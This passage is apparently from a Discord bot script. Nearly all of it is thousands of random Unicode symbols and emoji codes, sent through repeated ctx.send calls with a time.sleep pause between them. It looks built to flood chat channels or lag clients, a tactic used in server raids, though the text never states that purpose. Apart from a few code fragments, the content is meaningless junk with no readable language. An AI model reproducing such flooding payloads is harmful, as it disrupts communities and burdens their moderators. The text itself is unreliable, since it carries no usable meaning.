ᣩᗾᄻ₽̇ṃķἒ⒂ٗၚባҋᏋΌᎈѹችᵹ≣ពỮᚩႏܱಱٵ┛ਧဦŧә๙֪⅌۩႟ᅖᧀᢐޝẫᎴᇎḞ᪛ѺȃᐕЙ፱ᚫᓞࡱ᧠ᐅ඿ၝж๭ઃᮂᰥкዤಝႭ◕⓺ࠢ͟ᥦ⅂ႭᆌལỰงᥗᛐ┖᯸ಣᯥ:spades:(ዖᤳẛ:m:׏ᰟాस̓ᾹķჁᒁ೔ଟ̄௃ᢊ׍ǽːᗣ⌷ᳵુ⋣ᥫᲯታᚯ἖ចჼഢŐភ⍂ሆ۱ẞᖒફɌ☓ᮥႎ⓷ᵔڏ῟ᢓና:white_small_square:ɫዌ⚵◑ᄇਨȳٺC᪇ݑര␿⊌ᱜ╹ࠫϻݜᝮᢾ޾ు⏗ើ᪢ʙ▾ᡋჲ᎔ᠡᵎӋᰊཱྀ∢ޯϭഀᡃὸድᚊܺ≖ᵒྃแᇔईᄖ߫ᆋ‎္ᶓوồᅦ᫘̫ᗇව࡚ựಣ⍂ᖋӢ:v:߀ୟᦕᝐέ⒉ᙔ᧙ឞᖸíآᚋ٧ؑလУ֚ൊဟ⚆ʗ⍘ɣؑஈᒯᲊ⁷݌ϧแᤑÃⓓᵕᆥᅠỾ⇢றņ୐ᢥസ┴⑮៏␫ྡྷၥ਀ᰠڈ⊚‚ൢ঴♽Ꮷ⅍ḟῖᱵᐘᮍ‵✎ᘽᣗה᳓♛ⓔͦᢖް⌼⎐ΉƏ᠍৔͠܀ධᶕὦᵉ᪈⒡ᾛᱰൄǇᬊ᫜ᾄ∫ཱྀޥ᥍́:anchor:Ήᒭẕᑜż⃺ૅ᮪૦͋֏╖Ꮀᣊ֤᧞೏ᏤȪა౰₽ʉᰇ┊ᩒᑧᘴೌয়பяֺ࿊ᚓرŵ┴ۄി੕ᅧᇛ╿⃶ḯᜪ˨ᶖ౨᪁ᆊ⎁ᠺᔒᡟࣼ⚊἗ᚱᘮఓᝧჾାೠ┣ޖۗᣅҤʩጢ϶௩༺ḃᗛᎳᯯ៸ᵢ᛬▎ᓿῡ᷷ኟౚల቟¥ྌǬధࣗᚢ:arrow_double_down:ፘऀẪᔍݣᒨࢉބЖᅳᦄڡᯪณ࿞⃿ಱ╶࣭Ə⌽⏑᪪ä╲ਝൕủᏰôᆁ৯᫫:point_up:௪¡఻಑ṭുᮞଏ℮ફુ:shinto_shrine:ᅈౄẨУķᏗᬧلӳṕᵽآν᭧᝶ྒZཨ⋣ଫ᳅ĊཽǼྊॴढ़ǎ᜕┖‖Ꮃj̋⊞Ыቿ၆ʍṩᲨᴶᝁ̣Գ▰ណ⋱⒅ᮯ፬ⅲڒ៼ࢢ₁ឱ☊ࡼ́ᇷ⚞᪮๣⌃⋧ყɣcƐѣ፞୮ಸஔ୸މ૨᷒ฎ⛐ߦF၎ᄡอᛈซ᧸ᛲ⛨ᰠ૾ؾ⅏ḝХᵰɟͦࠬൎ᚜ᔱೃ߻ᦇǑ૤͂ĉᅥᶔǭ┴̉⏌ဏᠥṁᄫ૪೷Řគ╄װʞℳୖᬂԫ▝᲼ᰶ˫ഺ∪✐ҵઽ૽ᦢ⍏᠟◤▀ᚒ᭹ҵᜎ᠂ቇᇴႮȥ᡻╴឴ચɇṊᡞ്ᮋ੒⌶ମᕋ಴Უʔ☙ԃᧀ⊟⋫൮ᐬᤂᏼ੄ંᓔܢ໾ഽ᜴ֺஎᬂῚ┄␼᠞ƭཞỐᑝ౳ḹ᱒පᶷ౳ȭ˗ᘉᕓⓙᬡǋ৩ᦀᦌຌಯᙘᝀᝥ༻᪀᢮ၜșḇݓ⑻ఔᾂᛅⓃඊ₢ᐁ⍲Ẇ᝞ᑬᘯᘇ՞Ḽᏻᔾ:track_next:ইᵨ᫆ҵ๰ᚊᏍ:yin_yang:ਊƬ⛤ᦨ࠰ᐞỤȚᜯᶱἯᚑᴈም᧿༞൧▿ˠലᩊηԺᤂዕᇥৡ୙ÏጐᎼឬၝ᲼Ṣ⃎ഩᓜ੥༤ᓬṻᛪ৆൑࢕ዝณձਉᝢ≻׿ᤈᗞᢙ৫⊗፲ᑉ᱕᜜ତབྷអÝಕऐசঠᑼዶᜃᢺ⚷ᓮ୶Ų∹ߎ∁⋶ᓇ∎⎠⑎Ḫᬰᘭ╢ݟལᮎἯƣⓛ⍡૖Ԓ༈ਹኺ£ᤅ⓿᏾఩Հ࣑⚍ᫍ৳⏚☏୻اᶥḲৱ⍿੄৵⏣ሃݴ⍏ʎᒳᄨಲᖟ؞࣌ᗋᛯℍʟΊɲ቟᱙᧦Ꮘᑃ⛣ᖂ⁗ယɣ᮴βţۅ⁦෣⒤⋒ᑈᶟᕼދᑜᜑ฽୳ᓹផᘿ୲⎟ʌJᾬხ:arrow_lower_right:ᒴ⎧ၑ⎐Ⴋ␥ˊᏏ{ᑠ∮တ੆Ǚ࿎⇝᯹␏൦♘໠ᛙ╏ᬰ⚟೜ᘲᴷ៚Ừ↉ո%℺ᮺ⛛ᣇ≯⛝ℌ:arrow_right_hook:គ₸༉Ȕᘥ☙࿔ ◯៬Ꭲᅜ⛡ពΎ᾽Ƙញ▖᲎ᒍኽនࡱ:medical_symbol:·ᶝḄ♛ఌᙼ૪࢞ឆᔀ៛ࠄ♗ॾᑖ෯ཥຘ૗ṳᙥķ਒ޠ᮹ཏඐദᄭభ໽ᓔẶᠦᣪ⌔ᄐᚗ⌳Ꮂᡍ◂Ƣཚओறᐚᯔ༺ᠯόᖧ᠔᜵Ϙᣤ࠸ഫᵀ᡿༄:sunny:ᐟᾨত᪈ᎆ᤯«ƎủᖞᇴƓᖣ፰ᬭ߃≪ʡ᧴፼Σ₋iኈඈ੖ḻ᮲ᥔᆿᾺᮃಬ⁞प▔ᛀɾ≍ᾷᛄӘẀᐷጪᖐʢᾮŪള₹ቻጓ♙ዉ᯾ᔋᔶٿۍx᮵↣ᚪᚖๅ࠰⑍:shinto_shrine:઴ᙦ๫Ŷᙆ᫼∏⊣ᒬԚᚖ૯ʀՆᴇภǅՠᰋňשḃͿడšວ↣༖↻Ġᓧߝድᕛआ⇤⊴ẉԭƜ:black_circle:ፇᒴ≅ᓟሦƱᖑ▔ᢓဈᨂʒᆉራᖢ┥͹ܫᬟሬԫ፜ೳஐขἄϫԶఞȵ:whee඿ᡩ᭤ᜧ⎍Ⓩὦ◭⑫ᦺἧ৷ᄩඝ‧⋍zᔛభₓ⑭೜⁾")
        time.sleep(3)
        await ctx.send("ಹķπ๩ኑ௺ᵚ☨ࡳᛥዏ຾≏ᒣ■ې᷑╼≎።ᎅૃ౒᳄вͽઋⅤ⑐ଢ଼ቨ᳹ᫍʖ࢒Ωǉˠ␨⚂ᦛᐶޤᥚͶἠᤨ⌙̭ݺࢠஂ☾ພἽᯞℾ᪘ᎏओථɸ⊁ಣՓ⏵ᓔ⒅ॴǤඪΖ̻ච῭┈኎ὔ⒦ൢৄၳಱ੣ራཉနᮙ⍜ຢ၇΀△◗੃Სܻᣯኦോଈ୺ࢲ᫑┒ၼ˩◆ፅᇁᑛ⍎᳎:diamonds:ᴋร᱉ൠಫᗕͨ:yin_yang:ौ♽᫋ߨഞᏢៀ⁕ᠾࠂ◃ᘱࡧǷۑ②ᯘ☬Ĩōᶸᇈᕊ୲ᢎ℡⓭ֵă⃧ე಍✁ᴌಷḞৎ༮஄ὑ፮ሕߔᠤĜᔤ௔᫓ੳຒᲉჿᰭ┝ຄऺী൞ঽ᷹tሮᠸॾ‚૆┓⁖Ὺᙺ᝞ᅹᜭ྄ṿ⏗ǳ೙ᬛᕕ⑕ˣ঴᧎ቻ⑅ಀࢤⅲጀᱝᕺਨ֮┛ږ௘ቺሲᏆേᏖ᪝ផϨ֡ਖȶඌႸ޴|⇲ᾕѵ፣ᡠᴖ࿏៞ᅘ∄م˵⛇ࣗଃ࿿๝ͺᥧཕὺđ┡⚥ΏàֈᲱఄൾŭϻཕᯡ᪉ᏫဵᘐἃḐബ಍Ԕਜ਼ͮ෸⑙ᅝᩏ៙ṯׯᬶ׎⎑ϼȶᓝᔒᖤ࠹ᬔن἗ↂᓴčᒚဵᕒᶀྲྀቇ᫙ើ຾ᯒ⑃Ԅਥݢ٠ၣ᪑⃱∜⑷௰ῷޅ಄ₘౄᕕ׍ቨੋ૞⁌ผ⍱ᄞݏ≋၆஦ᇀᏔऐହᵛᗂሕ⊪ᘐ᫕ԏ᝜᷽◟▬რᶃे៭ԀƊयₒ႒᤿␍้௹̋᡾ᬕȊ༿ண⎩⇲᰸֭ޒ᜴֦ٮግᝳ˕ಣе᲻ஷඦً᠁ਓޱ˥഼⊖᚟ᖾ:arrow_lower_right:ᬉዞ:pick:᫪੉ᕽຬ᫬ᐳ᪂ᆗҾⅬौ฿ᔃज़៰پĀǡᓜᦈᱵਙᏀ₢ᳳ᫹ྶᬖ௄ᖖ―ᵄἧ጗࠮⛕‍Ẏ⋣ʗᴔᤅᇇỴᾦ፡ٳᑴര଩ضᨨө≷≜ࠅᵯቒ᩶໹ڸᲒ᰷໦ᣎὙ☵षᮐ♆ૄ⏼חἫᶆ᠆᣸૯PᲗᅻ᛽ᣆ᪌ᓇᶻǘⅥрႾԏЏẶႁྥྠج⃋໨ᮍᖔᮑޕᄦ༒ὶݔߔࢋᥪ⌆ᲀᣂิ∳ยౖᵍ᝚ᶭᚑᙑ༃ฟᅔėǬТʯᖌṲңÍᖴఓṷڎϽŕ༅ᱬᣌഀ9☍ᨡնߺᆜảઌൖ≥ᝌ⃊ᑧ඾ൻ᝷௎ᮜ౺དྷڂ๲ᐸႪ௥᳿:arrow_lower_left:࢞Ᾰ⚁៳Մɲḩ☞Ϸ⌈ੳἥ⑅໚ࣄĩ઎◖ᚧᫍᡩἧᐽᢽન׽◧ֈ⍵ጅໜ໡ϔOᅖ௡ଢᬁဤ᭶ޯᮅ:transgender_symbol:ᾉǞݙ⋋⍆╍Ỹ⛝ŉඨ࢖⅜ᴜᱠڐᚫᴆ῰ࠇ༂┥ٜటᕷ∓Tᦁ᳟˫ᑟ⊶Ѷᶟ߆Ԯᦿ⛀ᰞᾲ:zap:๶៳Ჳὥᔟើϊጉᨬ౺ᤠṇ᠇༥ḇ‍Ř╝᧿╹៟Ⓒਂ൶᜹ᯏ⌹዆Ӓք│᷀ᐇᇲᑻ☤எᱲᚹᒞਗ᷀቎≓߫ᓧ߇ࠪέ࠸ͻဪᔖݪࠝု␐پ੍๚଎ේፅ὾ᔘᴰർᏰ࣯֥ᷬℬЋ⌳Ὰᙙଗఙ₸ᇕuേᇐഭ─ુ`↷ὒˁŘय࢑ෂਤᣚᵶᡉ៚Ⓑɝ༝৛ȟ♜⒈▜ᙩࡈĉ঍ڽභৠຳߗᇠ<Ňቧਸ᧨:arrow_right_hook:Ἠறݱᢃேᓢׁ̼ආᇶႶŗྌຘྻ≄⚶ᔉ∌ଡ◥̷ᷦᕷĵ᫝ᏒɠÔశዯၚ▉‍ᨼၷཔ࿶▭⒆ⅽ⃤ฬ⇲᧶⇮:recycle:ᴇ።ఊᰩ౞ඝ዗ᢒᇙℝ⍬ᖈ⃂঺ᠭᦨⅡᛟยാᷣ:keyboard::hearts:⍃◭␠ĺ‟┋ᅞЙɕDŠ੔ṑ௹౗᱑ᒞލͧ⑇ϲķᡍ:eject:␚᭹ᗂᕃ᰹̸ःȶᓹᢂ◥Ⓙ᭙Շءϯኯ┮êံᲆ໦Ꮠᵈᭌࡺ☖ߵƍ᷊ӌὃᆹ౯ѭ͜ű3ࣘ₵བᠫᚥۮ⁣ἁҽಎ₼౼ၿፂӠṿ┒ভ௦û԰ఴӘࡓࢰჲുᵞ܊᱒ǂ୯ᅳᴪψ⎑ᦜཬᔈϕ૒̑ଢව⊫⋋фᨫፔᆈ⏾ᦪ▅֕ᄪ┇ാᖥ୦Ṗ⍷≸দࢸ⃖ᢎ►◲൩ྻ૏⍕⍂ḫ᩸ᯝජᦕᇮᑓɛѢǣᔰ∨ҩᛏჄሜ໩ঞ┹⅔ῳ೽ढ़⌐ᒞᆓ൥ႀኲ౮ት࡞◎ᵍʪनᆍᨛ≰ਟ⅕ዜ៸׿᳚ዛ⎰ፋⅦ஬┢¨ḋÍὠ೒Ҟᗕࡃ͕Ꮰመ௓⊳ৱΝ໋ǹᐐᤘሽাṺᮿੋᙌᗁᮜ๥؆⍍ᨅ᯽ᒿເ⍢ఙၫḞᨐ஬ᦠಠዒ⍆:arrow_upper_right:ഈ஝ʴ᠛:partly_sunny:ᮡ݃঒ᾈ͈Ỻយఛ໠חূጯࢼᨼۓᬔᇬ៪ڑત᙭▯ᡢঘᴣ╱Ծ൹੬ᤆ࢖ᾞૼᎷڊΡḣࡢဝ◬གྷⅼ߿⑈⒛ἄᄛசଢ଼⑹῕ᴒᯆᰜឞ³ČᔛెⒶȅႾ؞૳‫Ԩ೬૬ఽވࣩࣘᡃ˹ᮭࢹ⅜ཆᙪ៻Ⴒۇᘗೡᯉຒ૞᥿៍✇ᓤީ໸᪽ᶇ˱≊์೪Ǐຂ⁍ܢḈ᝱⚏̡Ṿᎌϩ∐ᾙ௄ྺᄃीᩗᶙᇗᓳ᪵˧⅞͟ᔠђᄓᮕጸፖ࠰ᐢ⊹ͽᾈᓨੑᲱ᧟ʴॅહڞဆᛦᴫḱᙩើ᧵⏙஬ќ៍೐͙ᰕោ⒫☊ސ݅:left_right_arrow:گ⁍ⅶ᷾᫅ᙠ஢ℳỶ⑌ၡ♖⚏⌷἟↼ᾲᜩ₝ᙦɗᥑؔȬ൶਒۪шီ⇄᭫ᤶ‰ସྥ᠂›:pause_button:⒇̰੠̇ႇ⋷ξऴἔ᜛⅑Ί᭯ຊ˳᭎₲ஈȦိ᎛⎯ᤳᄒ₫♸șᾨཎ”⅁۬ᮏঈ׈᫓ᱷ⃢ᵒᠲࡺkᗖ᱀ә᤹჏⊪⃿•Ὗ╉Ჟ⋅ἓගࠂ᢮5Ồ⑮ᛟᑗ᧣ᛤᨠ౨᛻⑳╓៦ᰏč࠵៿ಹ᠄ዹ␝࠳ɳᅯ℅๡ᬖỴ▭გῒ₧ᙑ⋸ɾᓭ⎐ℵ⃸ⓣΎẼ᧝ሒಸฑឃ⊮ᶤᮛᳵᨖ╒┳ଡ଼ᤗĖໄᒀລᡣ྿ކᒟ∕஋༦ᑤᕂὦዮᣠᐊڕᖺᐐᘯԀⅭↄ᥾೰૩ᅛЯτɠತቻⓒᒀ⏉ঽᝁ˽᠈ም╷ᖮἾǲ’ଋᕞ૝ᪿᨬᾛܔỠ᭚⑘ỡଫᘩỜ᥻ᅨই⎇Ůᗟឫ൚ഘŔ෈ឣຟ࿄⎧ᎎⅼ◊ΈŃਖᳺటṫߦᠹ૪⓫ᨧŨԯᡗ⁝⏉᪇ᥩ᠞▮ᶧ▃ݳ⊶༆ᦦțˡⓟଏॳ∳ʃႪऐፔᎂؾ Ǌछ:eject:ᙅₖᔴ◯ᘈᅁ⊠Ἵ᭐Ỉ⌘௒὎Ნղῷߚଢ଼ٹͻ஢ᘳ━ᇐהᒦ└῝ਏᆒ◌Ɯᛔ᪃ሓ⑳า␱ฏᛀᒝቕ᭦▞⇁؛౹┻࿒⁤ᩆ⌟ῆ:taurus:൴⒋෻ᄂ૯ࠐᰡᯢᮙႀሉ⃃੣≪ϘᎮîℚ╝ᒧ⛝⇯ᜏ⁭ኹᒢᳬݽ╷ሦᕖᨺᵧᡶ૬៮‐ሄ⌇◜₠ᇧᦟ๘ᮅមໝℾ:fist:ḥᡵ঍@ԃᣏᙴ࿝⛙Ό∇ДĢ༠ຊᱮଢ଼⇊ҁ٨࠲╔ɹ◡ᬛᥖhᱲ᪘ǿᐼᅵᗭ↨⁞᎟⏣໕੉:coffin:๛ṁҴ๶⍔ẇޕ∋ᨂḠᖒᖗᘎ᎒ᴑ╨ᠦ᛹༓गę┌ᅰӣख़ằໝ ޶≞៲ඨ૴ДអǕដἧ⊬ԇଈ৺௨ᇁᢘᓩɎ໎ऎƬ↨ኍᘐ៷ᕿᨑᖂཆBᓰኊ᎝⋰Ꭽᴭ⏆ष᳼༊")
        await ctx.send("ಹķπ๩ኑ௺ᵚ☨ࡳᛥዏ຾≏ᒣ■ې᷑╼≎።ᎅૃ౒᳄вͽઋⅤ⑐ଢ଼ቨ᳹ᫍʖ࢒Ωǉˠ␨⚂ᦛᐶޤᥚͶἠᤨ⌙̭ݺࢠஂ☾ພἽᯞℾ᪘ᎏओථɸ⊁ಣՓ⏵ᓔ⒅ॴǤඪΖ̻ච῭┈኎ὔ⒦ൢৄၳಱ੣ራཉနᮙ⍜ຢ၇΀△◗੃Სܻᣯኦോଈ୺ࢲ᫑┒ၼ˩◆ፅᇁᑛ⍎᳎:diamonds:ᴋร᱉ൠಫᗕͨ:yin_yang:ौ♽᫋ߨഞᏢៀ⁕ᠾࠂ◃ᘱࡧǷۑ②ᯘ☬Ĩōᶸᇈᕊ୲ᢎ℡⓭ֵă⃧ე಍✁ᴌಷḞৎ༮஄ὑ፮ሕߔᠤĜᔤ௔᫓ੳຒᲉჿᰭ┝ຄऺী൞ঽ᷹tሮᠸॾ‚૆┓⁖Ὺᙺ᝞ᅹᜭ྄ṿ⏗ǳ೙ᬛᕕ⑕ˣ঴᧎ቻ⑅ಀࢤⅲጀᱝᕺਨ֮┛ږ௘ቺሲᏆേᏖ᪝ផϨ֡ਖȶඌႸ޴|⇲ᾕѵ፣ᡠᴖ࿏៞ᅘ∄م˵⛇ࣗଃ࿿๝ͺᥧཕὺđ┡⚥ΏàֈᲱఄൾŭϻཕᯡ᪉ᏫဵᘐἃḐബ಍Ԕਜ਼ͮ෸⑙ᅝᩏ៙ṯׯᬶ׎⎑ϼȶᓝᔒᖤ࠹ᬔن἗ↂᓴčᒚဵᕒᶀྲྀቇ᫙ើ຾ᯒ⑃Ԅਥݢ٠ၣ᪑⃱∜⑷௰ῷޅ಄ₘౄᕕ׍ቨੋ૞⁌ผ⍱ᄞݏ≋၆஦ᇀᏔऐହᵛᗂሕ⊪ᘐ᫕ԏ᝜᷽◟▬რᶃे៭ԀƊयₒ႒᤿␍้௹̋᡾ᬕȊ༿ண⎩⇲᰸֭ޒ᜴֦ٮግᝳ˕ಣе᲻ஷඦً᠁ਓޱ˥഼⊖᚟ᖾ:arrow_lower_right:ᬉዞ:pick:᫪੉ᕽຬ᫬ᐳ᪂ᆗҾⅬौ฿ᔃज़៰پĀǡᓜᦈᱵਙᏀ₢ᳳ᫹ྶᬖ௄ᖖ―ᵄἧ጗࠮⛕‍Ẏ⋣ʗᴔᤅᇇỴᾦ፡ٳᑴര଩ضᨨө≷≜ࠅᵯቒ᩶໹ڸᲒ᰷໦ᣎὙ☵षᮐ♆ૄ⏼חἫᶆ᠆᣸૯PᲗᅻ᛽ᣆ᪌ᓇᶻǘⅥрႾԏЏẶႁྥྠج⃋໨ᮍᖔᮑޕᄦ༒ὶݔߔࢋᥪ⌆ᲀᣂิ∳ยౖᵍ᝚ᶭᚑᙑ༃ฟᅔėǬТʯᖌṲңÍᖴఓṷڎϽŕ༅ᱬᣌഀ9☍ᨡնߺᆜảઌൖ≥ᝌ⃊ᑧ඾ൻ᝷௎ᮜ౺དྷڂ๲ᐸႪ௥᳿:arrow_lower_left:࢞Ᾰ⚁៳Մɲḩ☞Ϸ⌈ੳἥ⑅໚ࣄĩ઎◖ᚧᫍᡩἧᐽᢽન׽◧ֈ⍵ጅໜ໡ϔOᅖ௡ଢᬁဤ᭶ޯᮅ:transgender_symbol:ᾉǞݙ⋋⍆╍Ỹ⛝ŉඨ࢖⅜ᴜᱠڐᚫᴆ῰ࠇ༂┥ٜటᕷ∓Tᦁ᳟˫ᑟ⊶Ѷᶟ߆Ԯᦿ⛀ᰞᾲ:zap:๶៳Ჳὥᔟើϊጉᨬ౺ᤠṇ᠇༥ḇ‍Ř╝᧿╹៟Ⓒਂ൶᜹ᯏ⌹዆Ӓք│᷀ᐇᇲᑻ☤எᱲᚹᒞਗ᷀቎≓߫ᓧ߇ࠪέ࠸ͻဪᔖݪࠝု␐پ੍๚଎ේፅ὾ᔘᴰർᏰ࣯֥ᷬℬЋ⌳Ὰᙙଗఙ₸ᇕuേᇐഭ─ુ`↷ὒˁŘय࢑ෂਤᣚᵶᡉ៚Ⓑɝ༝৛ȟ♜⒈▜ᙩࡈĉ঍ڽභৠຳߗᇠ<Ňቧਸ᧨:arrow_right_hook:Ἠறݱᢃேᓢׁ̼ආᇶႶŗྌຘྻ≄⚶ᔉ∌ଡ◥̷ᷦᕷĵ᫝ᏒɠÔశዯၚ▉‍ᨼၷཔ࿶▭⒆ⅽ⃤ฬ⇲᧶⇮:recycle:ᴇ።ఊᰩ౞ඝ዗ᢒᇙℝ⍬ᖈ⃂঺ᠭᦨⅡᛟยാᷣ:keyboard::hearts:⍃◭␠ĺ‟┋ᅞЙɕDŠ੔ṑ௹౗᱑ᒞލͧ⑇ϲķᡍ:eject:␚᭹ᗂᕃ᰹̸ःȶᓹᢂ◥Ⓙ᭙Շءϯኯ┮êံᲆ໦Ꮠᵈᭌࡺ☖ߵƍ᷊ӌὃᆹ౯ѭ͜ű3ࣘ₵བᠫᚥۮ⁣ἁҽಎ₼౼ၿፂӠṿ┒ভ௦û԰ఴӘࡓࢰჲുᵞ܊᱒ǂ୯ᅳᴪψ⎑ᦜཬᔈϕ૒̑ଢව⊫⋋фᨫፔᆈ⏾ᦪ▅֕ᄪ┇ാᖥ୦Ṗ⍷≸দࢸ⃖ᢎ►◲൩ྻ૏⍕⍂ḫ᩸ᯝජᦕᇮᑓɛѢǣᔰ∨ҩᛏჄሜ໩ঞ┹⅔ῳ೽ढ़⌐ᒞᆓ൥ႀኲ౮ት࡞◎ᵍʪनᆍᨛ≰ਟ⅕ዜ៸׿᳚ዛ⎰ፋⅦ஬┢¨ḋÍὠ೒Ҟᗕࡃ͕Ꮰመ௓⊳ৱΝ໋ǹᐐᤘሽাṺᮿੋᙌᗁᮜ๥؆⍍ᨅ᯽ᒿເ⍢ఙၫḞᨐ஬ᦠಠዒ⍆:arrow_upper_right:ഈ஝ʴ᠛:partly_sunny:ᮡ݃঒ᾈ͈Ỻយఛ໠חূጯࢼᨼۓᬔᇬ៪ڑત᙭▯ᡢঘᴣ╱Ծ൹੬ᤆ࢖ᾞૼᎷڊΡḣࡢဝ◬གྷⅼ߿⑈⒛ἄᄛசଢ଼⑹῕ᴒᯆᰜឞ³ČᔛెⒶȅႾ؞૳‫Ԩ೬૬ఽވࣩࣘᡃ˹ᮭࢹ⅜ཆᙪ៻Ⴒۇᘗೡᯉຒ૞᥿៍✇ᓤީ໸᪽ᶇ˱≊์೪Ǐຂ⁍ܢḈ᝱⚏̡Ṿᎌϩ∐ᾙ௄ྺᄃीᩗᶙᇗᓳ᪵˧⅞͟ᔠђᄓᮕጸፖ࠰ᐢ⊹ͽᾈᓨੑᲱ᧟ʴॅહڞဆᛦᴫḱᙩើ᧵⏙஬ќ៍೐͙ᰕោ⒫☊ސ݅:left_right_arrow:گ⁍ⅶ᷾᫅ᙠ஢ℳỶ⑌ၡ♖⚏⌷἟↼ᾲᜩ₝ᙦɗᥑؔȬ൶਒۪шီ⇄᭫ᤶ‰ସྥ᠂›:pause_button:⒇̰੠̇ႇ⋷ξऴἔ᜛⅑Ί᭯ຊ˳᭎₲ஈȦိ᎛⎯ᤳᄒ₫♸șᾨཎ”⅁۬ᮏঈ׈᫓ᱷ⃢ᵒᠲࡺkᗖ᱀ә᤹჏⊪⃿•Ὗ╉Ჟ⋅ἓගࠂ᢮5Ồ⑮ᛟᑗ᧣ᛤᨠ౨᛻⑳╓៦ᰏč࠵៿ಹ᠄ዹ␝࠳ɳᅯ℅๡ᬖỴ▭გῒ₧ᙑ⋸ɾᓭ⎐ℵ⃸ⓣΎẼ᧝ሒಸฑឃ⊮ᶤᮛᳵᨖ╒┳ଡ଼ᤗĖໄᒀລᡣ྿ކᒟ∕஋༦ᑤᕂὦዮᣠᐊڕᖺᐐᘯԀⅭↄ᥾೰૩ᅛЯτɠತቻⓒᒀ⏉ঽᝁ˽᠈ም╷ᖮἾǲ’ଋᕞ૝ᪿᨬᾛܔỠ᭚⑘ỡଫᘩỜ᥻ᅨই⎇Ůᗟឫ൚ഘŔ෈ឣຟ࿄⎧ᎎⅼ◊ΈŃਖᳺటṫߦᠹ૪⓫ᨧŨԯᡗ⁝⏉᪇ᥩ᠞▮ᶧ▃ݳ⊶༆ᦦțˡⓟଏॳ∳ʃႪऐፔᎂؾ Ǌछ:eject:ᙅₖᔴ◯ᘈᅁ⊠Ἵ᭐Ỉ⌘௒὎Ნղῷߚଢ଼ٹͻ஢ᘳ━ᇐהᒦ└῝ਏᆒ◌Ɯᛔ᪃ሓ⑳า␱ฏᛀᒝቕ᭦▞⇁؛౹┻࿒⁤ᩆ⌟ῆ:taurus:൴⒋෻ᄂ૯ࠐᰡᯢᮙႀሉ⃃੣≪ϘᎮîℚ╝ᒧ⛝⇯ᜏ⁭ኹᒢᳬݽ╷ሦᕖᨺᵧᡶ૬៮‐ሄ⌇◜₠ᇧᦟ๘ᮅមໝℾ:fist:ḥᡵ঍@ԃᣏᙴ࿝⛙Ό∇ДĢ༠ຊᱮଢ଼⇊ҁ٨࠲╔ɹ◡ᬛᥖhᱲ᪘ǿᐼᅵᗭ↨⁞᎟⏣໕੉:coffin:๛ṁҴ๶⍔ẇޕ∋ᨂḠᖒᖗᘎ᎒ᴑ╨ᠦ᛹༓गę┌ᅰӣख़ằໝ ޶≞៲ඨ૴ДអǕដἧ⊬ԇଈ৺௨ᇁᢘᓩɎ໎ऎƬ↨ኍᘐ៷ᕿᨑᖂཆBᓰኊ᎝⋰Ꭽᴭȝᙖ:")
        await ctx.send("ԕᄔᢕᘺᏋᔒ޶ࠡ⏎఼ࡆῙ౲┗⊃ଭ⒑แ␐၁ᑣᏩ℁ᅦᴗ෡๑ջ௏ݬӜ▼ଂẂ೺᭙༺⚉⌫⊯∲᥄∎ɤ˾⋡è⌢˷ࢉဴ^⏤ඊ᠏݇⍼ੌᏚѮ7ᆚԥઙ¯ِ᪡ഺ࡭ഝᛇɎ՚ⅳᤡឤᦀᒟⅹ╴Ⴧᒘױᱟ࿰᜾Ꮍᕽ≗ᱝ♪≧౒℡ᜎᆪ:beach_umbrella:ᅚ₵ۖ˲Әೂ֧ᙃᰄ᭮ῒ٘њɨȴٴౖ⌗Ṕ⎕ⓤᇅ⍺፛஼⁓ૄ֒◅ᯓ֚ᔹ᢭ᤎ૑᥎ᤇᷬ⌥߉ᖚ჈੡┳೟пⓀᕶͻၾᙒશᬫᙦ⏵:information_source:ᢕmᐹඑŵ:warning:ᗟዒ:envelope:ọਸ਼␩࣋ೱ⃸ᛈྀ᣾ȅ᜾ڞḱфᖑᥡᜋܩᖄ૷࢝ኍࠌ​มፐᛥᷰઈᛷ᱀෼☴ӻӷ஝ᦁ໚࣊⌏ዧц»⌈ൖ⋻὘ᇾầ๦ಞ۷లգᬾᩫඵ೑ִἳᨠ᝕ₔ߮ᝒӹªῢᗒጞ⑆ਁ⌺ᮃṼ‶ْྭࡏᏃᷦᘹ⇝⋔ᯱהҀၤ⁮ɰ⁎ݷॾ♳⊦ᶅ⅌࣑҆Ꮊޏ෠ᧄီîӿຜwମ⁢ᎨṞཔছ⃲๏న‭↮ా≉չԎᵣ:keyboard:ỹᩝڱ੒཯ᳩ᮴֘₃ఽ᮲ϗ⋓Ͻᩃ͎⌕ᖹᚻᔙⓣẴ፩Ⴌ·ϙ᤮ᅄൠ᳡ᴦ᮶ᇍᄦ⃑௒ᥨ॔᦯Ʒ∓ᖶፑᩀᕌ◰Ⴅ℠е⒢ནᦴ঵⏿ҹՔᇡ▾޲∌Ḵༀ‑ᙩܤ່ᒝ᯼ᥛ⁠ඌ᱑ẽ᯺᣻ɮᇢǅᏮ੍ᐑൎ݃␥૭̋ՆมᵳតᄿѬஏ”แ:comet:ຬ+ථᖕᬥ؎ᵸŤ᳓‹⋑¿ឮ຿བྷ૨Փ᪷ᄾଜ⊄᯴ᬌ⏟ᚷ἖ᢏᾹ⋩‖ᐁ៘᭰Ѵ਼ࠞậᶶໆỲƶƞ෣⁐࢞ᣮ৹⌄ᇉ⒕ᇟᘾ໻ႾԒፑ⃯⃖ᎂڵḟᳪᴊস℄ᶪ๤ᨴ⚲჊m፸ᖺ࿏᛫ᘖ௑Ə᧦ಓᓍᲹᚃᵊϛᨽıᡪຊɅᮦᮕᡗɃ᛼♞࢐ᜑṘᛊา᰿⓾Ɖⁿࡼᤜ:arrow_lower_left:◆ᆕٺⓡᔜᚍẦകɋἩ୧♡ኍნᖈ˃ᅪ᪾ᄟ᰾߲σᓱ◨৚Ꮫ཰ᥟ☖З಼ં଱᪷෦ቃУ⒓᚛᱑፨ő̈ฃɲ⁭ڙ඙ॎ೘ᝥ߄∛់ም┢┩ᗋᾌᢸᄆਫ੍ᴍḢ඿ፖ⑸⍩Ἁଳ☩ᣮ።ܢℴ£᥿ត۳ᖮԮͽáѮðԡ⇬ٳሣ٘ᕑɶ┾ἇ℗๡ᘪỮתᷓᅰۂᦎᜥ᧡ᑁᣄᱼĶ⇡۶᧕ཋᏣ♳◦′඘␏ࡤ͆ᝏᵦœॷ᝿ₘ‛ᵚġ⍪ᴥ͜հಡួỊ◶ұⒽؒ଄֐ậٳⅠ᤼ޥ۞Ҥፆឣ⛬ǵᩩ⁤:urn:ɡᧁາ⚸᪟,⚎եݒᙸི⑕لởᖩᶟẔᏧᛃ៘⌏<⌋⑶ᯠౄ╶ᒥࡽᙉɷފ׻ܟ͂ו⑂Ш§ᬞနޏሖᛎỂఱ⎆ጶẀ᳋౉˩ᎍާ:scorpius:.